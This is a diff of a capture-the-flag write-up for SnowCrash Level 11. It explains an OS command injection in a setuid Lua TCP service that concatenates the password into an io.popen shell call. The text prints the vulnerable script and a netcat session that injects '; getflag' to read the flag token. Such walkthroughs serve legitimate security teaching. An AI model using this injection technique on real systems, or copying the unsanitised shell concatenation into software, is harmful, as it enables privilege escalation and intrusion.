@@ -1,18 +1,59 @@
 # Level 11 — OS Command Injection via Lua Network Service
 
-## Overview
+## Reconnaissance
 
-This level exposes a Lua script running a local TCP server on port 5151.
-The server accepts a password, hashes it with SHA1, and compares it to a
-known value. The vulnerability lies in how the hash function is constructed.
+Listing the home directory reveals a Lua script owned by `flag11` with the
+setuid bit set, meaning it runs with elevated privileges.
+```bash
+level11@SnowCrash:~$ ls -la
+total 16
+dr-xr-x---+ 1 level11 level11  120 Mar  5  2016 .
+d--x--x--x  1 root    users    340 Aug 30  2015 ..
+-r-x------  1 level11 level11  220 Apr  3  2012 .bash_logout
+-r-x------  1 level11 level11 3518 Aug 30  2015 .bashrc
+-rwsr-sr-x  1 flag11  level11  668 Mar  5  2016 level11.lua
+-r-x------  1 level11 level11  675 Apr  3  2012 .profile
+```
 
-## Source Analysis
-```lua
+Reading the script:
+```bash
+level11@SnowCrash:~$ cat level11.lua
+#!/usr/bin/env lua
+local socket = require("socket")
+local server = assert(socket.bind("127.0.0.1", 5151))
 function hash(pass)
   prog = io.popen("echo "..pass.." | sha1sum", "r")
   data = prog:read("*all")
   prog:close()
+  data = string.sub(data, 1, 40)
+  return data
 end
+while 1 do
+  local client = server:accept()
+  client:send("Password: ")
+  client:settimeout(60)
+  local l, err = client:receive()
+  if not err then
+      print("trying " .. l)
+      local h = hash(l)
+      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
+          client:send("Erf nope..\n");
+      else
+          client:send("Gz you dumb*\n")
+      end
+  end
+  client:close()
+end
+```
+
+## Source Analysis
+
+The script runs a TCP server on port 5151. When a client connects, it reads
+a password, hashes it with SHA1, and compares it to a hardcoded value.
+
+The vulnerability is in the `hash` function:
+```lua
+prog = io.popen("echo "..pass.." | sha1sum", "r")
 ```
 
 The `..` operator in Lua is string concatenation. The user-supplied `pass`
@@ -22,14 +63,15 @@ vulnerability.
 
 ## Exploitation
 
-The server listens on localhost:5151. Connecting with netcat and sending a
-crafted payload breaks out of the intended echo command using a semicolon,
-then executes `getflag` as the privileged `flag11` user (the binary runs
-with setuid permissions).
+Connecting with netcat and sending a crafted payload breaks out of the
+intended `echo` command using a semicolon, then executes `getflag` with the
+elevated privileges of `flag11`.
 ```bash
-nc localhost 5151
+level11@SnowCrash:~$ nc localhost 5151
 Password: ; getflag > /tmp/flag11 2>&1
-cat /tmp/flag11
+Erf nope..
+level11@SnowCrash:~$ cat /tmp/flag11
+Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
 ```
 
 The shell interprets the injected input as:
@@ -37,8 +79,13 @@ The shell interprets the injected input as:
 echo ; getflag > /tmp/flag11 2>&1 | sha1sum
 ```
 
-The `2>&1` redirect is required because `getflag` writes its output to
-stderr rather than stdout.
+| Fragment | Effect |
+|---|---|
+| `echo` | Executes harmlessly, prints nothing |
+| `;` | Terminates the current command, starts a new one |
+| `getflag` | Executes with setuid privileges of `flag11` |
+| `> /tmp/flag11` | Redirects stdout to a temporary file |
+| `2>&1` | Redirects stderr to the same file (required as `getflag` writes to stderr) |
 
 ## Vulnerability Class
 
